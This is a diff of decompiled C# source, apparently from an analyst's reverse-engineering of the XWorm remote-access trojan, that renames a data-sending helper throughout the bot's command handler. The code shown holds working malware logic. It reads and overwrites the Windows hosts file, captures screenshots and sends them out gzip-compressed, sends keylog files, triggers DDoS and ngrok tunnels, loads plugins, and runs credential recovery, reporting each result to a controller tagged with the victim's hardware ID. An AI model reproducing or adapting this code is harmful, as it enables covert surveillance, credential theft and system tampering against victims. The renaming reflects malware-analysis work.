@@ -32,7 +32,7 @@ namespace Stub
 				if (Operators.CompareString(left, "pong", false) == 0)
 				{
 					mw_Utils.mw_isAwaitingPong = false;
-					mw_Utils.mw_sendDataOverXChat("pong" + mw_config.mw_XwormTag + Conversions.ToString(mw_Utils.mw_timeSinceLastConn));
+					mw_Utils.mw_sendDataOverSocket("pong" + mw_config.mw_XwormTag + Conversions.ToString(mw_Utils.mw_timeSinceLastConn));
 					mw_Utils.mw_timeSinceLastConn = 0;
 				}
 				else if (Operators.CompareString(left, "rec", false) == 0)
@@ -151,39 +151,39 @@ namespace Stub
 				}
 				else if (Operators.CompareString(left, "Xchat", false) == 0)
 				{
-					mw_Utils.mw_sendDataOverXChat(Conversions.ToString(Operators.AddObject(Operators.AddObject("Xchat", mw_Communications.mw_objectVal), mw_Handler.mw_getHWID())));
+					mw_Utils.mw_sendDataOverSocket(Conversions.ToString(Operators.AddObject(Operators.AddObject("Xchat", mw_Communications.mw_objectVal), mw_Handler.mw_getHWID())));
 				}
 				else if (Operators.CompareString(left, "Hosts", false) == 0)
 				{
 					string text = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\etc\\hosts";
-					mw_Utils.mw_sendDataOverXChat(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject("Hosts", mw_Communications.mw_objectVal), mw_Handler.mw_getHWID()), mw_Communications.mw_objectVal), text), mw_Communications.mw_objectVal), File.ReadAllText(text))));
+					mw_Utils.mw_sendDataOverSocket(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject("Hosts", mw_Communications.mw_objectVal), mw_Handler.mw_getHWID()), mw_Communications.mw_objectVal), text), mw_Communications.mw_objectVal), File.ReadAllText(text))));
 				}
 				else if (Operators.CompareString(left, "Shosts", false) == 0)
 				{
 					try
 					{
 						File.WriteAllText(array[1], array[2]);
-						mw_Utils.mw_sendDataOverXChat(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject("HostsMSG", mw_Communications.mw_objectVal), mw_Handler.mw_getHWID()), mw_Communications.mw_objectVal), "Modified successfully!")));
+						mw_Utils.mw_sendDataOverSocket(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject("HostsMSG", mw_Communications.mw_objectVal), mw_Handler.mw_getHWID()), mw_Communications.mw_objectVal), "Modified successfully!")));
 					}
 					catch (Exception ex6)
 					{
-						mw_Utils.mw_sendDataOverXChat(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject("HostsErr", mw_Communications.mw_objectVal), mw_Handler.mw_getHWID()), mw_Communications.mw_objectVal), ex6.Message)));
+						mw_Utils.mw_sendDataOverSocket(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject("HostsErr", mw_Communications.mw_objectVal), mw_Handler.mw_getHWID()), mw_Communications.mw_objectVal), ex6.Message)));
 					}
 				}
 				else if (Operators.CompareString(left, "DDos", false) == 0)
 				{
-					mw_Utils.mw_sendDataOverXChat("DDos");
+					mw_Utils.mw_sendDataOverSocket("DDos");
 				}
 				else if (Operators.CompareString(left, "ngrok", false) == 0)
 				{
-					mw_Utils.mw_sendDataOverXChat(Conversions.ToString(Operators.AddObject(Operators.AddObject("ngrok", mw_Communications.mw_objectVal), mw_Handler.mw_getHWID())));
+					mw_Utils.mw_sendDataOverSocket(Conversions.ToString(Operators.AddObject(Operators.AddObject("ngrok", mw_Communications.mw_objectVal), mw_Handler.mw_getHWID())));
 				}
 				else if (Operators.CompareString(left, "plugin", false) == 0)
 				{
 					mw_Communications.mw_strArr = array;
 					if (mw_Handler.mw_getSubkeyValue(array[1]) == null)
 					{
-						mw_Utils.mw_sendDataOverXChat(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("sendPlugin", mw_Communications.mw_objectVal), array[1])));
+						mw_Utils.mw_sendDataOverSocket(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("sendPlugin", mw_Communications.mw_objectVal), array[1])));
 					}
 					else
 					{
@@ -203,7 +203,7 @@ namespace Stub
 				}
 				else if (Operators.CompareString(left, "OfflineGet", false) == 0)
 				{
-					mw_Utils.mw_sendDataOverXChat(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("OfflineGet", mw_Communications.mw_objectVal), mw_Handler.mw_getHWID()), mw_Communications.mw_objectVal), File.ReadAllText(mw_config.mw_logFile))));
+					mw_Utils.mw_sendDataOverSocket(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("OfflineGet", mw_Communications.mw_objectVal), mw_Handler.mw_getHWID()), mw_Communications.mw_objectVal), File.ReadAllText(mw_config.mw_logFile))));
 				}
 				else if (Operators.CompareString(left, "$Cap", false) == 0)
 				{
@@ -236,7 +236,7 @@ namespace Stub
 						Rectangle srcRect = new Rectangle(0, 0, bitmap.Width, bitmap.Height);
 						graphics3.DrawImage(image, destRect, srcRect, GraphicsUnit.Pixel);
 						bitmap2.Save(memoryStream, ImageFormat.Jpeg);
-						mw_Utils.mw_sendDataOverXChat(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("#CAP", mw_Communications.mw_objectVal), mw_Handler.mw_getHWID()), mw_Communications.mw_objectVal), Convert.ToBase64String(mw_Handler.mw_compressByteArrayToGZIP(memoryStream.ToArray())))));
+						mw_Utils.mw_sendDataOverSocket(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("#CAP", mw_Communications.mw_objectVal), mw_Handler.mw_getHWID()), mw_Communications.mw_objectVal), Convert.ToBase64String(mw_Handler.mw_compressByteArrayToGZIP(memoryStream.ToArray())))));
 						try
 						{
 							graphics.Dispose();
@@ -289,7 +289,7 @@ namespace Stub
 							}
 							if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(instance, null, "Name", new object[0], null, null, null), "RunRecovery", false))
 							{
-								mw_Utils.mw_sendDataOverXChat(Conversions.ToString(Operators.ConcatenateObject("Recovery" + mw_config.mw_XwormTag + mw_Handler.mw_getHWID() + mw_config.mw_XwormTag + Conversions.ToString(Convert.ToInt32(mw_Communications.mw_strArr[2])) + mw_config.mw_XwormTag, NewLateBinding.LateGet(instance, null, "Invoke", new object[]
+								mw_Utils.mw_sendDataOverSocket(Conversions.ToString(Operators.ConcatenateObject("Recovery" + mw_config.mw_XwormTag + mw_Handler.mw_getHWID() + mw_config.mw_XwormTag + Conversions.ToString(Convert.ToInt32(mw_Communications.mw_strArr[2])) + mw_config.mw_XwormTag, NewLateBinding.LateGet(instance, null, "Invoke", new object[]
 								{
 									null,
 									new object[]
@@ -357,7 +357,7 @@ namespace Stub
 										mw_Communications.mw_strArr[2]
 									}
 								}, null, null, null, true);
-								mw_Utils.mw_sendDataOverXChat(Conversions.ToString(Operators.AddObject(Operators.AddObject("ngrok+", mw_Communications.mw_objectVal), mw_Handler.mw_getHWID())));
+								mw_Utils.mw_sendDataOverSocket(Conversions.ToString(Operators.AddObject(Operators.AddObject("ngrok+", mw_Communications.mw_objectVal), mw_Handler.mw_getHWID())));
 								return;
 							}
 							if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(instance, null, "Name", new object[0], null, null, null), "ENC", false))
@@ -416,7 +416,7 @@ namespace Stub
 		{
 			try
 			{
-				mw_Utils.mw_sendDataOverXChat(Conversions.ToString(Operators.AddObject(Operators.AddObject("Msg", mw_Communications.mw_objectVal), value)));
+				mw_Utils.mw_sendDataOverSocket(Conversions.ToString(Operators.AddObject(Operators.AddObject("Msg", mw_Communications.mw_objectVal), value)));
 			}
 			catch (Exception ex)
 			{
@@ -428,7 +428,7 @@ namespace Stub
 		{
 			try
 			{
-				mw_Utils.mw_sendDataOverXChat(Conversions.ToString(Operators.AddObject(Operators.AddObject("Error", mw_Communications.mw_objectVal), cpFo3EGRKyC4MZ3XjDNC22TN)));
+				mw_Utils.mw_sendDataOverSocket(Conversions.ToString(Operators.AddObject(Operators.AddObject("Error", mw_Communications.mw_objectVal), cpFo3EGRKyC4MZ3XjDNC22TN)));
 			}
 			catch (Exception ex)
 			{
@@ -462,7 +462,7 @@ namespace Stub
 						int num2 = 0;
 						do
 						{
-							Thread thread = new Thread(delegate()
+							Thread thread = new Thread(delegate ()
 							{
 								try
 								{
@@ -573,7 +573,7 @@ namespace Stub
 				try
 				{
 					int num = 0;
-					for (;;)
+					for (; ; )
 					{
 						string text = null;
 						short wDriverIndex = (short)num;
@@ -589,7 +589,7 @@ namespace Stub
 						}
 					}
 					return true;
-					Block_3:;
+				Block_3:;
 				}
 				catch (Exception ex)
 				{
